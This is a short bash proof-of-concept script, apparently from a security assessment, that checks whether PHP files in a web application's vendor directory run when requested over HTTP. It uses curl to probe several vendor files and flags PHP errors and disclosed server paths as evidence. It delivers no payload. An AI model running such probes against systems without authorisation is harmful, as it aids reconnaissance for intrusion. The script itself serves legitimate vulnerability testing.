#!/bin/bash

# POC: PHP Code Execution Risk - Vendor Library Files Directly Executable
# This script demonstrates that PHP files in the vendor directory are executed
# by the PHP interpreter rather than served as plaintext, creating RCE risk

TARGET="${1:-http://localhost:8081}"
VENDOR_FILE="/vendor/twig/twig/src/Loader/FilesystemLoader.php"

echo "[*] Testing PHP Code Execution in Vendor Directory"
echo "[*] Target: $TARGET"
echo ""

# Test 1: Access vendor PHP file and check if it's executed
echo "[+] Test 1: Accessing vendor PHP file to verify code execution"
echo "[*] URL: $TARGET$VENDOR_FILE"
echo ""

RESPONSE=$(curl -s -w "\n%{http_code}" "$TARGET$VENDOR_FILE")
HTTP_CODE=$(echo "$RESPONSE" | tail -n1)
BODY=$(echo "$RESPONSE" | head -n-1)

echo "[*] HTTP Status Code: $HTTP_CODE"
echo ""
echo "[*] Response Body:"
echo "$BODY"
echo ""

# Check if response contains PHP error (proof of execution)
if echo "$BODY" | grep -q "Fatal error\|Error\|Exception"; then
    echo "[+] VULNERABLE: PHP code is being executed!"
    echo "[+] Evidence: PHP Fatal Error thrown instead of serving PHP source"
    echo ""
    
    # Extract file path from error if present
    if echo "$BODY" | grep -q "\/var\/www\/html"; then
        FILE_PATH=$(echo "$BODY" | grep -oP '\/var\/www\/html[^<]*' | head -1)
        echo "[+] File Path Disclosed: $FILE_PATH"
        echo ""
    fi
    
    EXECUTION_CONFIRMED=1
else
    echo "[-] FAILED: No PHP error detected. The file might not exist or access is blocked."
    EXECUTION_CONFIRMED=0
fi

# Test 2: Check for common vendor PHP files
echo "[+] Test 2: Enumerating common vendor PHP files for execution"
echo ""

VENDOR_FILES=(
    "/vendor/autoload.php"
    "/vendor/composer/autoload_real.php"
    "/vendor/twig/twig/src/Environment.php"
)

for FILE in "${VENDOR_FILES[@]}"; do
    HTTP_CODE=$(curl -s -o /dev/null -w "%{http_code}" "$TARGET$FILE")
    if [ "$HTTP_CODE" = "200" ] || [ "$HTTP_CODE" = "500" ]; then
        echo "[+] $FILE: HTTP $HTTP_CODE (Accessible)"
    fi
done

echo ""

# Test 3: Verify PHP parsing by checking response headers
echo "[+] Test 3: Analyzing response headers to confirm PHP processing"
echo ""

HEADERS=$(curl -s -I "$TARGET$VENDOR_FILE")
echo "[*] Response Headers:"
echo "$HEADERS"
echo ""

# If we got PHP errors, the PHP interpreter processed the file
if [ $EXECUTION_CONFIRMED -eq 1 ]; then
    echo "[+++] CRITICAL RISK CONFIRMED:"
    echo "[+++] PHP files in vendor directory are executed, not served as source"
    echo "[+++] An attacker uploading malicious PHP to vendor would achieve RCE"
    echo ""
    exit 0
else
    echo "[-] Unable to confirm PHP execution. Vendor access may be blocked."
    echo ""
    exit 1
fi